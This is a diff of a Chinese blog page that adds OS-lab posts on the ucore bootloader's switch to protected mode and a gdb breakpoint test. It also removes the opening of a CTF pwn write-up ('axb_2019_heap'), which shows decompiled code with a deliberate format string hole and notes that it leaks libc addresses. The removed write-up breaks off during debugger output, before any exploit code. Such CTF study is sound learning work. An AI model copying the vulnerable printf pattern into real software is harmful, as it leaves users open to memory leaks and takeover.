@@ -82,6 +82,292 @@
 
       <div class="outer">
         <section id="main">
+  <article id="post-challenge3-go-into-protected-mode" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/OS/lab1/challenge3-go-into-protected-mode/challenge3-go-into-protected-mode/">challenge3:go_into_protected_mode</a>
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2021-11-11T08:18:57.000Z" itemprop="datePublished">2021年11月11日</time>
+</span>
+      
+  <div class="article-category">
+    <i class="fa fa-classify"></i>
+    <a class="article-category-link" href="/categories/OS/">OS</a> > <a class="article-category-link" href="/categories/OS/lab1/">lab1</a> > <a class="article-category-link" href="/categories/OS/lab1/challenge3-go-into-protected-mode/">challenge3:go into protected mode</a>
+  </div>
+
+      
+      
+<a href="/OS/lab1/challenge3-go-into-protected-mode/challenge3-go-into-protected-mode/#comments" class="article-comment-link">
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="challenge3-go-into-protected-mode"><a href="#challenge3-go-into-protected-mode" class="headerlink" title="challenge3:go into protected mode"></a>challenge3:go into protected mode</h1><p>BIOS将通过读取硬盘主引导扇区到内存，并转跳到对应内存中的位置执行bootloader。分析bootloader是如何完成从实模式进入保护模式的。</p>
+<p>提示：需要阅读<strong>小节“保护模式和分段机制”</strong>和lab1/boot/bootasm.S源码，了解如何从实模式切换到保护模式，需要了解：</p>
+<ul>
+<li><p>为何开启A20，以及如何开启A20</p>
+</li>
+<li><p>如何初始化GDT表</p>
+</li>
+<li><p>如何使能和进入保护模式</p>
+</li>
+</ul>
+<h3 id="bootLoader开始运作"><a href="#bootLoader开始运作" class="headerlink" title="bootLoader开始运作"></a>bootLoader开始运作</h3><h4 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h4><p>首先进入<code>bootasm.S</code>中，从<code>0x7c00</code>（BIOS加载<code>bootLoader</code>到内存<code>0x7c00</code>处）开始执行命令；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># start address should be 0:7c00, in real mode, the beginning address of the running bootloader</span><br><span class="line">.globl start</span><br><span class="line">start:</span><br><span class="line">.code16                                             # Assemble for 16-bit mode</span><br><span class="line">    cli                                             # Disable interrupts</span><br><span class="line">    cld                                             # String operations increment</span><br><span class="line"></span><br><span class="line">    # Set up the important data segment registers (DS, ES, SS).</span><br><span class="line">    xorw %ax, %ax                                   # Segment number zero</span><br><span class="line">    movw %ax, %ds                                   # -&gt; Data Segment</span><br><span class="line">    movw %ax, %es                                   # -&gt; Extra Segment</span><br><span class="line">    movw %ax, %ss                                   # -&gt; Stack Segment</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>可以看到，先执行<code>cli</code>关闭中断，再执行<code>cld</code>，将标志寄存器flag的方向标志位df清零，接着将寄存器初始化置零；</p>
+<blockquote>
+<p>df，全称是direction Flags，是Intel8086/8088CPU程序状态标志寄存器（16位寄存器）九个标志位（CF,PF,AF,ZF,SF,TF,IF,OF,DF）之一。当该位置1时（DF=1），存储器地址自动减少，串操作指令为自动减量指令，即从高位到低位处理字符串；当该位置0时（DF=0），存储器地址自动增加，串操作指令为自动增量指令。</p>
+</blockquote>
+<h4 id="开启A20"><a href="#开启A20" class="headerlink" title="开启A20"></a>开启A20</h4><h5 id="About-A20"><a href="#About-A20" class="headerlink" title="About A20"></a>About A20</h5><h6 id="历史问题"><a href="#历史问题" class="headerlink" title="历史问题"></a>历史问题</h6><p>Intel早期的8086 CPU提供了20根地址线,可寻址空间范围即0<del>2^20(00000H</del>FFFFFH)的 1MB内存空间。但8086的数据处理位宽位16位，无法直接寻址1MB内存空间，所以8086提供了段地址加偏移地址的地址转换机制。PC机的寻址结构是segment:offset，segment和offset都是16位的寄存器，最大值是0ffffh，换算成物理地址的计算方法是把segment左移4位，再加上offset，所以segment:offset所能表达的寻址空间最大应为0ffff0h + 0ffffh = 10ffefh（前面的0ffffh是segment=0ffffh并向左移动4位的结果，后面的0ffffh是可能的最大offset），这个计算出的10ffefh是多大呢？大约是1088KB，就是说，segment:offset的地址表示能力，超过了20位地址线的物理寻址能力。所以当寻址到超过1MB的内存时，会发生“回卷”（不会发生异常）。但下一代的基于Intel 80286 CPU的PC AT计算机系统提供了24根地址线，这样CPU的寻址范围变为 2^24=16M,同时也提供了保护模式，可以访问到1MB以上的内存了，此时如果遇到“寻址超过1MB”的情况，系统不会再“回卷”了，这就造成了向下不兼容。为了保持完全的向下兼容性，IBM决定在PC AT计算机系统上加个硬件逻辑，来模仿以上的回绕特征，于是出现了A20 Gate。他们的方法就是把A20地址线控制和键盘控制器的一个输出进行AND操作，这样来控制A20地址线的打开（使能）和关闭（屏蔽\禁止）。一开始时A20地址线控制是被屏蔽的（总为0），直到系统软件通过一定的IO操作去打开它（参看bootasm.S）。很显然，在实模式下要访问高端内存区，这个开关必须打开，在保护模式下，由于使用32位地址线，如果A20恒等于0，那么系统只能访问奇数兆的内存，即只能访问0–1M、2-3M、4-5M……，这样无法有效访问所有可用内存。所以在保护模式下，这个开关也必须打开。</p>
+<h6 id="8042键盘控制器"><a href="#8042键盘控制器" class="headerlink" title="8042键盘控制器"></a>8042键盘控制器</h6><p>在保护模式下，为了使能所有地址位的寻址能力，需要打开A20地址线控制，即需要通过向键盘控制器8042发送一个命令来完成。键盘控制器8042将会将它的的某个输出引脚的输出置高电平，作为 A20 地址线控制的输入。一旦设置成功之后，内存将不会再被绕回(memory wrapping)，这样我们就可以寻址整个 286 的 16M 内存，或者是寻址 80386级别机器的所有 4G 内存了。</p>
+<p>键盘控制器8042的逻辑结构图如下所示。从软件的角度来看，如何控制8042呢？早期的PC机，控制键盘有一个单独的单片机8042，现如今这个芯片已经给集成到了其它大片子中，但其功能和使用方法还是一样，当PC机刚刚出现A20 Gate的时候，估计为节省硬件设计成本，工程师使用这个8042键盘控制器来控制A20 Gate，但A20 Gate与键盘管理没有一点关系。下面先从软件的角度简单介绍一下8042这个芯片。</p>
+<p><img src="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab1_figs/image012.png"></p>
+<p>图13 键盘控制器8042的逻辑结构图</p>
+<p>8042键盘控制器的IO端口是0x60～0x6f，实际上IBM PC/AT使用的只有0x60和0x64两个端口（0x61、0x62和0x63用于与XT兼容目的）。8042通过这些端口给键盘控制器或键盘发送命令或读取状态。输出端口P2用于特定目的。位0（P20引脚）用于实现CPU复位操作，位1（P21引脚）用户控制A20信号线的开启与否。系统向输入缓冲（端口0x64）写入一个字节，即发送一个键盘控制器命令。可以带一个参数。参数是通过0x60端口发送的。 命令的返回值也从端口 0x60去读。8042有4个寄存器：</p>
+<ul>
+<li><p>1个8-bit长的Input buffer；Write-Only；</p>
+</li>
+<li><p>1个8-bit长的Output buffer； Read-Only；</p>
+</li>
+<li><p>1个8-bit长的Status Register；Read-Only；</p>
+</li>
+<li><p>1个8-bit长的Control Register；Read/Write。</p>
+</li>
+</ul>
+<p>有两个端口地址：60h和64h，有关对它们的读写操作描述如下：</p>
+<ul>
+<li><p>读60h端口，读output buffer</p>
+</li>
+<li><p>写60h端口，写input buffer</p>
+</li>
+<li><p>读64h端口，读Status Register</p>
+</li>
+<li><p>操作Control Register，首先要向64h端口写一个命令（20h为读命令，60h为写命令），然后根据命令从60h端口读出Control Register的数据或者向60h端口写入Control Register的数据（64h端口还可以接受许多其它的命令）。</p>
+</li>
+</ul>
+<p>Status Register的定义（要用bit 0和bit 1）：</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>bit</td>
+<td>meaning</td>
+</tr>
+<tr>
+<td>0</td>
+<td>output register (60h) 中有数据</td>
+</tr>
+<tr>
+<td>1</td>
+<td>input register (60h/64h) 有数据</td>
+</tr>
+<tr>
+<td>2</td>
+<td>系统标志（上电复位后被置为0）</td>
+</tr>
+<tr>
+<td>3</td>
+<td>data in input register is command (1) or data (0)</td>
+</tr>
+<tr>
+<td>4</td>
+<td>1=keyboard enabled, 0=keyboard disabled (via switch)</td>
+</tr>
+<tr>
+<td>5</td>
+<td>1=transmit timeout (data transmit not complete)</td>
+</tr>
+<tr>
+<td>6</td>
+<td>1=receive timeout (data transmit not complete)</td>
+</tr>
+<tr>
+<td>7</td>
+<td>1=even parity rec’d, 0=odd parity rec’d (should be odd)</td>
+</tr>
+</tbody></table>
+<p>除了这些资源外，8042还有3个内部端口：Input Port、Outport Port和Test Port，这三个端口的操作都是通过向64h发送命令，然后在60h进行读写的方式完成，其中本文要操作的A20 Gate被定义在Output Port的bit 1上，所以有必要对Outport Port的操作及端口定义做一个说明。</p>
+<ul>
+<li><p>读Output Port：向64h发送0d0h命令，然后从60h读取Output Port的内容</p>
+</li>
+<li><p>写Output Port：向64h发送0d1h命令，然后向60h写入Output Port的数据</p>
+</li>
+<li><p>禁止键盘操作命令：向64h发送0adh</p>
+</li>
+<li><p>打开键盘操作命令：向64h发送0aeh</p>
+</li>
+</ul>
+<h6 id="开启"><a href="#开启" class="headerlink" title="开启"></a>开启</h6><p>有了这些命令和知识，就可以实现操作A20 Gate来从实模式切换到保护模式了。 理论上讲，我们只要操作8042芯片的输出端口（64h）的bit 1，就可以控制A20 Gate，但实际上，当你准备向8042的输入缓冲区里写数据时，可能里面还有其它数据没有处理，所以，我们要首先禁止键盘操作，同时等待数据缓冲区中没有数据以后，才能真正地去操作8042打开或者关闭A20 Gate。打开A20 Gate的具体步骤大致如下（参考bootasm.S）：</p>
+<ol>
+<li><p>等待8042 Input buffer为空；</p>
+</li>
+<li><p>发送Write 8042 Output Port （P2）命令到8042 Input buffer；</p>
+</li>
+<li><p>等待8042 Input buffer为空；</p>
+</li>
+<li><p>将8042 Output Port（P2）得到字节的第2位置1，然后写入8042 Input buffer；</p>
+</li>
+</ol>
+<p>接下来开启A20，使得CPU进入保护模式之后能够充分使用32位的寻址能力；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">    # Enable A20:</span><br><span class="line">    #  For backwards compatibility with the earliest PCs, physical</span><br><span class="line">    #  address line 20 is tied low, so that addresses higher than</span><br><span class="line">    #  1MB wrap around to zero by default. This code undoes this.</span><br><span class="line">seta20.1:</span><br><span class="line">    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">    testb $0x2, %al                                 # check 2nd bit is 0? if 0 then jump, means not empty.</span><br><span class="line">    jnz seta20.1</span><br><span class="line"></span><br><span class="line">    movb $0xd1, %al                                 # send 0xd1(1101 0001) to port 0x64</span><br><span class="line">    outb %al, $0x64                                 # 0xd1 means: write data to 8042&#x27;s P2 port</span><br><span class="line"></span><br><span class="line">seta20.2:</span><br><span class="line">    inb $0x64, %al                                  # Wait for not busy(8042 input buffer empty).</span><br><span class="line">    testb $0x2, %al                                 # check 2nd bit is 0? if 0 then jump, means not empty.</span><br><span class="line">    jnz seta20.2</span><br><span class="line"></span><br><span class="line">    movb $0xdf, %al                                 # send 0xdf(1101 1111) to port 0x60</span><br><span class="line">    outb %al, $0x60                                 # 0xdf = 1101 1111, means set P2&#x27;s A20 bit(the 1 bit, 2nd bit) to 1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>首先会等待8042键盘控制器输入缓冲区为空，接着发送Write 8042 Output Port （P2）命令到8042 Input buffer，等待8042键盘控制器输入缓冲区为空，将8042 Output Port（P2）得到字节的第2位置为1，这是因为输出端口的第二个位为A20选通标志，然后写入8042 Input buffer；</p>
+<p>至此A20开启，进入保护模式之后可以使用4G的寻址能力；</p>
+<h4 id="GDT表初始化"><a href="#GDT表初始化" class="headerlink" title="GDT表初始化"></a>GDT表初始化</h4><p>在<code>bootasm.S</code>中存在：</p>
+<p>几个参数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Start the CPU: switch to 32-bit protected mode, jump into C.</span><br><span class="line"># The BIOS loads this code from the first sector of the hard disk into</span><br><span class="line"># memory at physical address 0x7c00 and starts executing in real mode</span><br><span class="line"># with %cs=0 %ip=7c00.</span><br><span class="line"></span><br><span class="line">.set PROT_MODE_CSEG,        0x8                     # kernel code segment selector</span><br><span class="line">.set PROT_MODE_DSEG,        0x10                    # kernel data segment selector</span><br><span class="line">.set CR0_PE_ON,             0x1                     # protected mode enable flag</span><br></pre></td></tr></table></figure>
+
+
+<p>GDT初始化</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># Bootstrap GDT</span><br><span class="line">.p2align 2                                          # force 4 byte alignment</span><br><span class="line">gdt:</span><br><span class="line">    SEG_NULLASM                                     # null seg</span><br><span class="line">    SEG_ASM(STA_X|STA_R, 0x0, 0xffffffff)           # code seg for bootloader and kernel</span><br><span class="line">    SEG_ASM(STA_W, 0x0, 0xffffffff)                 # data seg for bootloader and kernel</span><br><span class="line"></span><br><span class="line">gdtdesc:</span><br><span class="line">    .word 0x17                                      # sizeof(gdt) - 1</span><br><span class="line">    .long gdt                                       # address gdt</span><br></pre></td></tr></table></figure>
+
+
+<p>这里设置了代码段和数据段的<code>base</code>和<code>limit</code>分别为<code>0x0</code>和<code>0xffffffff</code>，此时逻辑地址等同于线性地址；</p>
+<h4 id="模式切换"><a href="#模式切换" class="headerlink" title="模式切换"></a>模式切换</h4><p>而后，使用<code>lgdt gdtdesc</code>来载入全局描述符表；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># Switch from real to protected mode, using a bootstrap GDT</span><br><span class="line"># and segment translation that makes virtual addresses</span><br><span class="line"># identical to physical addresses, so that the</span><br><span class="line"># effective memory map does not change during the switch.</span><br><span class="line">lgdt gdtdesc                         # load gdt</span><br><span class="line">movl %cr0, %eax                      # cr0的PE为开启状态，置为1</span><br><span class="line">orl $CR0_PE_ON, %eax</span><br><span class="line">movl %eax, %cr0</span><br></pre></td></tr></table></figure>
+
+
+<p>将cr0的PE位置为1，这里用异或置1，把返回值送入cr0；</p>
+<p>接着是一个长跳转指令；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># Jump to next instruction, but in 32-bit code segment.</span><br><span class="line"># Switches processor into 32-bit mode.</span><br><span class="line">ljmp $PROT_MODE_CSEG, $protcseg</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>这里将cs修改为32位段寄存器，跳转到了protcseg代码入口处，CPU进入32位模式；</p>
+<p>进行寄存器和栈的初始化，并调用bootmain，即进入操作系统内核加载；</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.code32                                             # Assemble for 32-bit mode</span><br><span class="line">protcseg:</span><br><span class="line">    # Set up the protected-mode data segment registers</span><br><span class="line">    movw $PROT_MODE_DSEG, %ax                       # Our data segment selector(value = 0x10)</span><br><span class="line">    movw %ax, %ds                                   # -&gt; DS: Data Segment</span><br><span class="line">    movw %ax, %es                                   # -&gt; ES: Extra Segment</span><br><span class="line">    movw %ax, %fs                                   # -&gt; FS</span><br><span class="line">    movw %ax, %gs                                   # -&gt; GS</span><br><span class="line">    movw %ax, %ss                                   # -&gt; SS: Stack Segment</span><br><span class="line"></span><br><span class="line">    # Set up the stack pointer and call into C. The stack region is from 0--start(0x7c00)</span><br><span class="line">    movl $0x0, %ebp</span><br><span class="line">    movl $start, %esp</span><br><span class="line">    call bootmain</span><br><span class="line"></span><br><span class="line">    # If bootmain returns (it shouldn&#x27;t), loop.</span><br><span class="line">spin:</span><br><span class="line">    jmp spin</span><br></pre></td></tr></table></figure>
+
+
+<p>至此，bootLoader完成了从实模式(直接物理地址)到保护模式（逻辑地址）的任务；</p>
+
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://www.jk404.cn/page/9/index.html">https://www.jk404.cn/page/9/index.html</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+
+
+        </div>
+      
+      
+      
+    </footer>
+  </div>
+</article>
+
+
+  <article id="post-challenge2-4-costomize-breakpoint" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/OS/lab1/challenge2-qemu-gdb/challenge2-4-costomize-breakpoint/">challenge2.4:costomize_breakpoint</a>
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-meta">
+      
+      <span class="article-date">
+  <i class="fa fa-date"></i>
+  <time class="dt-published" datetime="2021-11-11T08:13:51.000Z" itemprop="datePublished">2021年11月11日</time>
+</span>
+      
+  <div class="article-category">
+    <i class="fa fa-classify"></i>
+    <a class="article-category-link" href="/categories/OS/">OS</a> > <a class="article-category-link" href="/categories/OS/lab1/">lab1</a> > <a class="article-category-link" href="/categories/OS/lab1/challenge2-qemu-gdb/">challenge2:qemu&gdb</a>
+  </div>
+
+      
+      
+<a href="/OS/lab1/challenge2-qemu-gdb/challenge2-4-costomize-breakpoint/#comments" class="article-comment-link">
+  
+  <i class="fa fa-commt"></i>
+  留言
+</a>
+
+
+    </div>
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="challenge2-4-costomize-breakpoint"><a href="#challenge2-4-costomize-breakpoint" class="headerlink" title="challenge2.4:costomize breakpoint"></a>challenge2.4:costomize breakpoint</h1><p>找一个bootloader或内核中的代码位置，设置断点并进行测试。</p>
+<p>随便断在<code>0x7c08</code>看看；</p>
+<p>gdbinit：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">file bin/kernel</span><br><span class="line">target remote :1234</span><br><span class="line">break *0x7c08</span><br><span class="line">define hook-stop</span><br><span class="line">x/i $pc</span><br><span class="line">end</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+<p>调试结果</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(gdb) ni</span><br><span class="line">=&gt; 0x7c0a:      in     $0x64,%al</span><br><span class="line">0x00007c0a in ?? ()</span><br><span class="line">=&gt; 0x7c0c:      test   $0x2,%al</span><br><span class="line">0x00007c0c in ?? ()</span><br><span class="line">=&gt; 0x7c0e:      jne    0x7c0a</span><br><span class="line">0x00007c0e in ?? ()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+        
+        
+          <blockquote id="copyright">
+              <p>原文链接: <a href="https://www.jk404.cn/page/9/index.html">https://www.jk404.cn/page/9/index.html</a></p>
+              <p>版权声明: 转载请注明出处.</p>
+          </blockquote>
+        
+      
+    </div>
+    <footer class="article-footer">
+      
+        <div class="article-tag-wrap">
+          
+
+          
+          
+
+
+        </div>
+      
+      
+      
+    </footer>
+  </div>
+</article>
+
+
   <article id="post-challenge2-3-diff-asm" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-inner">
     
@@ -954,305 +1240,6 @@ PIE:      No PIE (0x400000)
 </article>
 
 
-  <article id="post-axb-2019-heap" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/CTF/PWN/uncategorized/axb-2019-heap/">axb_2019_heap</a>
-    </h1>
-  
-
-
-      </header>
-    
-    <div class="article-meta">
-      
-      <span class="article-date">
-  <i class="fa fa-date"></i>
-  <time class="dt-published" datetime="2021-10-25T05:09:19.000Z" itemprop="datePublished">2021年10月25日</time>
-</span>
-      
-  <div class="article-category">
-    <i class="fa fa-classify"></i>
-    <a class="article-category-link" href="/categories/CTF/">CTF</a> > <a class="article-category-link" href="/categories/CTF/PWN/">PWN</a> > <a class="article-category-link" href="/categories/CTF/PWN/uncategorized/">uncategorized</a>
-  </div>
-
-      
-      
-<a href="/CTF/PWN/uncategorized/axb-2019-heap/#comments" class="article-comment-link">
-  
-  <i class="fa fa-commt"></i>
-  留言
-</a>
-
-
-    </div>
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="axb-2019-heap"><a href="#axb-2019-heap" class="headerlink" title="axb_2019_heap"></a>axb_2019_heap</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>&ensp;&ensp;&ensp;&ensp;checksec；</p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image.jpg"></p>
-<p>&ensp;&ensp;&ensp;&ensp;跑一下程序；</p>
-<p><img src="/CTF/PWN/uncategorized/axb-2019-heap/image_1.png"></p>
-<p>&ensp;&ensp;&ensp;&ensp;丢到ida64里分析；</p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;main()函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl __noreturn <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> choice; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  init();</span><br><span class="line">  banner();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    choice = get_int();</span><br><span class="line">    <span class="keyword">switch</span> ( choice )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        add_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;None!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        edit_note();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;No such choices!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>&ensp;&ensp;&ensp;&ensp;banner()函数</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">banner</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> format; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to note management system!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, &amp;format);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, &quot;</span>, &amp;format);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;format);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n-------------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;format参数是一个很重要的提示，这里存在格式化字符串漏洞，可以泄露libc地址；</p>
-<p>&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;&ensp;调试可以得到：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">klose@ubuntu:~/ctf/pwn/file/buuctf/axb_2019_heap$ gdbchoose </span><br><span class="line">Please choose the mode of GDB?</span><br><span class="line">1.peda    2.gef    3.pwndbg</span><br><span class="line">Input your choice:3</span><br><span class="line">Please enjoy pwndbg!</span><br><span class="line"></span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to 